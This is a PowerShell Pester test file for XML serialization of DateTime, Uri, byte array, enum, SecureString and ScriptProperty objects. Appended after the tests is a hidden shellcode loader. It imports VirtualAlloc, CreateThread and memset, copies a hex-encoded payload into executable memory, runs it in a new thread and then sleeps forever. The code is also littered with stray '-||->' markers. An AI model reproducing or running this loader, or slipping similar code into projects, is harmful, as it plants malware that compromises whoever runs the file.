

 -||-> Describe "Serialization Tests" -tags "CI" {
     -||-> BeforeAll {
         -||-> $testfileName="SerializationTest.txt" <-||- 
         -||-> $testPath =  -||-> Join-Path $TestDrive $testfileName <-||-  <-||- 
         -||-> $testfile =  -||-> New-Item $testPath -Force <-||-  <-||- 
         -||-> function SerializeAndDeserialize([PSObject]$inputObject)
        {
             -||-> $xmlSerializer =  -||-> New-Object System.Xml.Serialization.XmlSerializer( -||-> $inputObject.GetType() <-||- ) <-||-  <-||- 
             -||-> $stream = [System.IO.StreamWriter]$testPath <-||- 
             -||-> $xmlWriter = [System.Xml.XmlWriter]::Create($stream) <-||- 
             -||-> $xmlSerializer.Serialize($xmlWriter,$inputObject) <-||- 
             -||-> $stream.Close() <-||- 

             -||-> $stream = [System.IO.StreamReader]$testPath <-||- 
             -||-> $xmlReader = [System.Xml.XmlReader]::Create($stream) <-||- 
             -||-> $outputObject = $xmlSerializer.Deserialize($xmlReader) <-||- 
             -||-> $stream.Close() <-||- 
             -||-> $xmlReader.Dispose() <-||- 
            return  -||-> $outputObject <-||- ;
        } <-||- 

        enum MyColorFlag
        {
            RED
            BLUE
        }
    } <-||- 
     -||-> AfterAll {
             -||-> Remove-Item $testPath -Force -ErrorAction SilentlyContinue <-||- 
    } <-||- 

     -||-> It 'Test DateTimeUtc serialize and deserialize work as expected.' {
         -||-> $inputObject = [System.DateTime]::UtcNow <-||- ;
         -||-> SerializeAndDeserialize( -||-> $inputObject <-||- ) | Should -Be $inputObject <-||- 
    } <-||- 

     -||-> It 'Test DateTime stamps serialize and deserialize work as expected.' {
         -||-> $objs = [System.DateTime]::MaxValue, [System.DateTime]::MinValue, [System.DateTime]::Today, ( -||-> new-object System.DateTime <-||- ), ( -||-> new-object System.DateTime 123456789 <-||- ) <-||- 
         -||-> foreach($inputObject in  -||-> $objs <-||- )
        {
            -||-> SerializeAndDeserialize( -||-> $inputObject <-||- ) | Should -Be $inputObject <-||- 
        } <-||- 
    } <-||- 

    
     -||-> It 'Test system Uri objects serialize and deserialize work as expected.' -Pending:$true {
         -||-> $uristrings = "http://www.microsoft.com","http://www.microsoft.com:8000","http://www.microsoft.com/index.html","http://www.microsoft.com/default.asp","http://www.microsoft.com/Hello%20World.htm" <-||- 
         -||-> foreach($uristring in  -||-> $uristrings <-||- )
        {
            -||-> $inputObject =  -||-> new-object System.Uri $uristring <-||-  <-||- 
            -||-> SerializeAndDeserialize( -||-> $inputObject <-||- ) | Should -Be $inputObject <-||- 
        } <-||- 
    } <-||- 

     -||-> It 'Test a byte array serialize and deserialize work as expected.' {
         -||-> $objs1 = [byte]0, [byte]1, [byte]2, [byte]3, [byte]255 <-||- 
         -||-> $objs2 = @() <-||- 
         -||-> $objs3 = [byte]128 <-||- 
         -||-> $objs4 = @() <-||- 
        for( -||-> $i=0 <-||- ; -||-> $i -lt 256 <-||- ; -||-> $i++ <-||- )
        {
            -||-> $objs4 += [byte]$i <-||- 
        }
         -||-> $objsArray =  -||-> New-Object System.Collections.ArrayList <-||-  <-||- 
         -||-> $objsArray.Add($objs1) <-||- 
         -||-> $objsArray.Add($objs2) <-||- 
         -||-> $objsArray.Add($objs3) <-||- 
         -||-> $objsArray.Add($objs4) <-||- 

         -||-> foreach($inputObject in  -||-> $objsArray <-||-  )
        {
            -||-> $outputs =  -||-> SerializeAndDeserialize( -||-> $inputObject <-||- ) <-||-  <-||- ;
           for( -||-> $i=0 <-||- ; -||-> $i -lt $inputObject.Length <-||- ; -||-> $i++ <-||- )
           {
                -||-> $outputs[$i] | Should -Be $inputObject[$i] <-||- 
           }
        } <-||- 
    } <-||- 

     -||-> It 'Test Enum serialize and deserialize work as expected.' {
         -||-> $inputObject = [MyColorFlag]::RED <-||- 
         -||-> SerializeAndDeserialize( -||-> $inputObject <-||- ).ToString() | Should -Be $inputObject.ToString() <-||- 
    } <-||- 

     -||-> It 'Test SecureString serialize and deserialize work as expected.' {
        
         -||-> $inputObject =  -||-> Convertto-Securestring -String "PowerShellRocks!" -AsPlainText -Force <-||-  <-||- 
         -||-> SerializeAndDeserialize( -||-> $inputObject <-||- ).Length | Should -Be $inputObject.Length <-||- 

    } <-||- 

     -||-> It 'Test ScriptProperty object serialize and deserialize work as expected.' {
         -||-> $versionObject =  -||-> New-Object PSObject <-||-  <-||- 
         -||-> $versionObject | Add-Member -MemberType NoteProperty -Name TestNote -Value "TestNote" <-||- 
         -||-> $versionObject | Add-Member -MemberType ScriptProperty -Name TestScriptProperty -Value {  -||-> ( -||-> $this.TestNote <-||- ) <-||-  } <-||- 

         -||-> SerializeAndDeserialize( -||-> $versionObject <-||- ).TestScriptProperty | Should -Be $versionObject.TestScriptProperty <-||- 
    } <-||- 
} <-||- 


 -||-> $EtZR = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $EtZR -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0x46,0x10,0x14,0xea,0xdd,0xc1,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x47,0x13,0x83,0xef,0xfc,0x03,0x47,0x49,0xf2,0xe1,0x16,0xbd,0x70,0x09,0xe7,0x3d,0x15,0x83,0x02,0x0c,0x15,0xf7,0x47,0x3e,0xa5,0x73,0x05,0xb2,0x4e,0xd1,0xbe,0x41,0x22,0xfe,0xb1,0xe2,0x89,0xd8,0xfc,0xf3,0xa2,0x19,0x9e,0x77,0xb9,0x4d,0x40,0x46,0x72,0x80,0x81,0x8f,0x6f,0x69,0xd3,0x58,0xfb,0xdc,0xc4,0xed,0xb1,0xdc,0x6f,0xbd,0x54,0x65,0x93,0x75,0x56,0x44,0x02,0x0e,0x01,0x46,0xa4,0xc3,0x39,0xcf,0xbe,0x00,0x07,0x99,0x35,0xf2,0xf3,0x18,0x9c,0xcb,0xfc,0xb7,0xe1,0xe4,0x0e,0xc9,0x26,0xc2,0xf0,0xbc,0x5e,0x31,0x8c,0xc6,0xa4,0x48,0x4a,0x42,0x3f,0xea,0x19,0xf4,0x9b,0x0b,0xcd,0x63,0x6f,0x07,0xba,0xe0,0x37,0x0b,0x3d,0x24,0x4c,0x37,0xb6,0xcb,0x83,0xbe,0x8c,0xef,0x07,0x9b,0x57,0x91,0x1e,0x41,0x39,0xae,0x41,0x2a,0xe6,0x0a,0x09,0xc6,0xf3,0x26,0x50,0x8e,0x30,0x0b,0x6b,0x4e,0x5f,0x1c,0x18,0x7c,0xc0,0xb6,0xb6,0xcc,0x89,0x10,0x40,0x33,0xa0,0xe5,0xde,0xca,0x4b,0x16,0xf6,0x08,0x1f,0x46,0x60,0xb9,0x20,0x0d,0x70,0x46,0xf5,0x82,0x20,0xe8,0xa6,0x62,0x91,0x48,0x17,0x0b,0xfb,0x47,0x48,0x2b,0x04,0x82,0xe1,0xc6,0xfe,0x44,0xce,0xbf,0x0f,0x17,0xa6,0xbd,0x0f,0x06,0xf6,0x4b,0xe9,0x42,0xe8,0x1d,0xa1,0xfa,0x91,0x07,0x39,0x9b,0x5e,0x92,0x47,0x9b,0xd5,0x11,0xb7,0x55,0x1e,0x5f,0xab,0x01,0xee,0x2a,0x91,0x87,0xf1,0x80,0xbc,0x27,0x64,0x2f,0x17,0x70,0x10,0x2d,0x4e,0xb6,0xbf,0xce,0xa5,0xcd,0x76,0x5b,0x06,0xb9,0x76,0x8b,0x86,0x39,0x21,0xc1,0x86,0x51,0x95,0xb1,0xd4,0x44,0xda,0x6f,0x49,0xd5,0x4f,0x90,0x38,0x8a,0xd8,0xf8,0xc6,0xf5,0x2f,0xa7,0x39,0xd0,0xb1,0x9b,0xef,0x1c,0xc4,0xf5,0x33 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $cRl=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $cRl.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$cRl,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



